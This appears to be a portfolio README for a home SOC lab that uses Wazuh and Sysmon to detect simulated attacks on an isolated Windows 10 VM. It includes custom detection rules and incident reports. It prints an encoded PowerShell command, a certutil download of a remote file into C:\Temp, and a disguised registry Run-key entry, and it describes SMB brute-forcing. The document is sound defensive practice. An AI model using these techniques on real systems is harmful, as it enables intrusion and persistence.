# Home SOC Lab: Wazuh SIEM & Windows Threat Detection

## 1. Overview
This project demonstrates an end-to-end local Security Operations Center (SOC) lab built to practice log ingestion, telemetry enrichment, attack simulation, detection engineering, and incident response.

The environment consists of a containerized Wazuh SIEM server monitoring an isolated Windows 10 endpoint enhanced with Sysmon, simulating real-world techniques mapped to the **MITRE ATT&CK** framework.


## 2. Architecture & Tech Stack

### Infrastructure Topology
* **Network Bridge:** Isolated NAT virtual network (`virbr0` - `192.168.122.0/24`)
* **SIEM Server (Host):** `192.168.122.1` (ports `1514/tcp` for agent log ingestion, `1515/tcp` for enrollment, `443/tcp` for Wazuh Dashboard
* **Monitored Endpoint (VM):** `Win10-Target` (`192.168.122.50`)

<img width="1024" height="572" alt="image" src="https://github.com/user-attachments/assets/3d2342d7-4579-4aa9-b2b3-6284a3e38232" />


### Tech Stack
* **Host OS (Attacking Machine) & Hypervisor:** Arch Linux, QEMU/KVM (`libvirt` / `virt-manager`)
* **Containerization:** Docker & Docker Compose (Single-node Wazuh deployment)
* **SIEM / XDR:** Wazuh v4.14.10 (Manager, Indexer, Dashboard)
* **Monitored Endpoint:** Windows 10 Pro (VirtIO storage & drivers, 2 vCPU, 4 GB RAM)
* **Endpoint Telemetry:** Microsoft Sysmon v15.22 (configured with `SwiftOnSecurity/sysmon-config`), Windows Security Event Logs
* **Attack Simulation Tools:** Nmap, smbclient, native Windows LOLBins (`powershell.exe`, `certutil.exe`, `reg.exe`)



## 3. Lab Deployment & Telemetry Setup

### 3.1 Wazuh SIEM Deployment (Docker)
The Wazuh single-node stack was deployed via Docker Compose with self-signed TLS cert-s generated with `generate-indexer-certs.yml`:
* `wazuh.manager` - log parsing, decoding, and rule evaluation engine
* `wazuh.indexer` - log storage and indexing
* `wazuh.dashboard` - web UI for alert triage and visualization

### 3.2 Endpoint Telemetry Enrichment (Sysmon)
To overcome the visibility gaps of default Windows logs (full command-line args, parent-child process trees, and network connections per process), MS Sysmon was installed on `Win10-Target` using the `SwiftOnSecurity` config baseline:

```powershell
Sysmon64.exe -accepteula -i sysmonconfig-swift.xml
```

### 3.3 Wazuh Agent Configuration
The Wazuh Agent was registered with the manager at 192.168.122.1 and configured to ingest the Sysmon operational event channel by appending the following XML block to `C:\Program Files (x86)\ossec-agent\ossec.conf`:
```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```
#### Verification

<img width="3058" height="1118" alt="image" src="https://github.com/user-attachments/assets/5a3f2f4f-9458-4f0a-857e-bb03ccdcb145" />



## 4. Detection Engineering (Custom Rules)


To detect living-off-the-land binaries (LOLBins) and obfuscated execution chains at process creation time, custom rules were implemented in `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager:

```xml
<group name="local,sysmon,windows,">

  <rule id="100100" level="12">
    <if_sid>61603,92057</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc|-EncodedCommand)</field>
    <description>Sysmon: Obfuscated PowerShell execution via EncodedCommand detected</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <rule id="100101" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache</field>
    <description>Sysmon: Potential Ingress Tool Transfer via certutil.exe (-urlcache)</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>

</group>
```

### Verification

<img width="2398" height="1332" alt="image" src="https://github.com/user-attachments/assets/ffb2217d-ff52-4984-a274-ea18bb0dabaa" />


## 5. Attack Scenarios & Incident Reports


| # | Scenario | MITRE ATT&CK Technique | Detection Source | Status |
| :--- | :--- | :--- | :--- | :--- |
| 1 | Obfuscated PowerShell & LOLBin Execution | `T1059.001`, `T1105` | Sysmon (`Event ID 1`) + Custom Rules | Completed |
| 2 | Network Reconnaissance & SMB Brute Force | `T1046`, `T1110` | Windows Security Log (`4625`) | Completed |
| 3 | Registry Run Key Persistence | `T1547.001` | Sysmon (`Event ID 13`) | Completed |


### Incident Report #01: Obfuscated PowerShell & LOLBin Execution (T1059.001, T1105)


* **Triggered Rules:** `100100` (Level 12) & `100101` (Level 12)
* **Attack Simulation:**
  1. Executed Base64-encoded PowerShell payload (`whoami; hostname`) with -WindowStyle Hidden (T1059.001).
  2. Executed `certutil.exe -urlcache -split -f` to pull a remote payload into `C:\Temp\test_payload.html` (T1105).
* **Telemetry & Forensic Artifacts (Sysmon Event ID 1):**
  * Parent Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  * Child Process 1: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand dwBoAG8AYQBtAGkAOwAgAGgAbwBzAHQAbgBhAG0AZQA=`
  * Child Process 2: `"C:\Windows\system32\certutil.exe" -urlcache -split -f http://example.com/ C:\Temp\test_payload.html`
* **Triage & Containment Actions:**
    1. Decoded the Base64 payload (`UTF-16LE`) to confirm command intent (`whoami; hostname`).
    2. Verified file creation events (`Sysmon Event ID 11`) in `C:\Temp` and removed the dropped artifact (`test_payload.html`).
    3. Recommended enforcing PowerShell Constrained Language Mode (CLM) and restricting outbound HTTP/HTTPS access for `certutil.exe` via Windows Defender Firewall.

#### Evidence (Wazuh Telemetry)

<img width="2434" height="1014" alt="image" src="https://github.com/user-attachments/assets/37d25362-27f4-4eb4-bd72-0b863d778e7e" />

#### Key Takeaways & Lessons Learned
- **Why Sysmon is Essential:** Standard Windows Security logs record *which* program started, but usually miss *how* it was launched. Sysmon (`Event ID 1`) fills this gap by logging full command-line arguments (such as `-EncodedCommand` or `-urlcache`), file hashes, and parent-child process relationships, making triage much faster.
- **How Wazuh Rule Inheritance Works:** Wazuh evaluates rules in a tree structure from general to specific. When a more specific built-in rule matches an event first (for example, rule `92057` for PowerShell spawning another encoded PowerShell), generic parent rules (`61603`) are bypassed. To catch both direct and nested executions, custom rules must inherit from both parent IDs (`<if_sid>61603,92057</if_sid>`).
- **Handling False Positives (Alert Triage):** During testing, PowerShell's normal background policy checks (`__PSScriptPolicyTest_*.ps1` created in `AppData\Local\Temp`) triggered built-in high-severity alerts (rule `92213`, Level 15). Investigating these events showed how legitimate OS behavior can create alert noise and why baseline tuning is critical in a real SOC.


### Incident Report #02: Network Reconnaissance & SMB Brute Force (`T1046`, `T1110`)

- **Source / Attacker Host:** Arch Linux (`GOSENS` / `192.168.122.1`)
- **Target Host:** `Win10-Target` (`192.168.122.50`)
- **Triggered Rules:**
  - `60122` (Level 5) - *Logon Failure - Unknown user or bad password* (`Event ID 4625`)
  - `60204` (Level 10) - *Multiple Windows Logon Failures* (`T1110`)
  - `60115` (Level 9) - *User account locked out (multiple login errors)* (`Event ID 4740`, `T1110`, `T1531`)
- **Attack Simulation:**
  1. Conducted TCP SYN and service version port scan against `192.168.122.50` using `nmap -sS -sV -p 135,139,445,3389`, identifying open SMB (`445/tcp`) and RPC (`135/tcp`, `139/tcp`) services (`T1046`).
 
    <img width="1734" height="712" alt="image" src="https://github.com/user-attachments/assets/df8c1177-731c-4e56-ae99-b2dadd4bc129" />

  2. Executed an automated SMBv3 credential brute-force loop via `smbclient` targeting `admin` account with a 15-password wordlist (`T1110`).
    
    <img width="1024" height="532" alt="image" src="https://github.com/user-attachments/assets/6571bbf7-3ec9-42e6-ae54-bb2a7a385c3b" />

- **Telemetry & Forensic Artifacts (Windows Security Logs):**
  - The first 10 attempts generated `Event ID 4625` (`NT_STATUS_LOGON_FAILURE`), triggering individual failure alerts (`60122`) and Wazuh's correlation rule (`60204`).
  - Attempt #11 triggered Windows' built-in Account Lockout Policy (`NT_STATUS_ACCOUNT_LOCKED_OUT`), generating `Event ID 4740` (`rule.id: 60115`) and recording the attacking workstation hostname (`GOSENS`) in the `TargetDomainName` field. <img width="2402" height="1350" alt="image" src="https://github.com/user-attachments/assets/3adaeeb1-8a1c-4f8e-a470-1eb5ad74b5c2" />
- **Triage & Containment Actions:**
  1. Verified alert correlation (`60204`) and confirmed account lockout (`60115`) for the `admin` account in Wazuh Discover.
  2. Disabled the `File and Printer Sharing` inbound firewall rule group on `Win10-Target` to close port `445/tcp` from network exposure and removed the temporary password wordlist from the attacker host.
  3. Recommended restricting SMB access via host firewall rules, enforcing strong password complexity, and maintaining strict Account Lockout thresholds.

### Incident Report #03: Persistence via Registry Run Keys (`T1547.001`)
- **Target Host:** `Win10-Target` (`192.168.122.50`)
- **Triggered Rule:** `92302` (Level 10) — *Registry entry to be executed on next logon was modified using command line application reg.exe* (`T1547.001`)
- **Attack Simulation:**
  1. Added a malicious persistence entry (`WindowsSecurityUpdate`) pointing to `C:\Windows\System32\calc.exe` under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` via `reg.exe` to achieve execution upon user logon (`T1547.001`).
  2. Verified successful registry modification using `reg query`.

     <img width="1742" height="1306" alt="image" src="https://github.com/user-attachments/assets/76b2af4b-e2bf-478b-8ae8-ae2f57a3e078" />

- **Telemetry & Forensic Artifacts (Sysmon Event ID 13):**
  - Sysmon captured the registry value modification (`Event ID 13`), recording the initiating binary (`C:\Windows\system32\reg.exe`), the full user hive path (`HKU\S-1-5-21-357749033-4230364695-543291694-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate`), and the payload path (`C:\Windows\System32\calc.exe`).

    <img width="2414" height="988" alt="image" src="https://github.com/user-attachments/assets/5c17c207-f77b-497b-ac3e-9b165700841a" />

- **Triage & Eradication Actions:**
  1. Verified alert `92302` in Wazuh Discover and confirmed unauthorized modification of the `CurrentVersion\Run` autostart key.
  2. Removed the rogue `WindowsSecurityUpdate` value from the registry via `reg delete` and verified cleanup with `reg query`.
  3. Recommended restricting unauthorized `reg.exe` executions for standard users via AppLocker / WDAC policies and maintaining continuous Sysmon monitoring on `Run` / `RunOnce` registry hives.
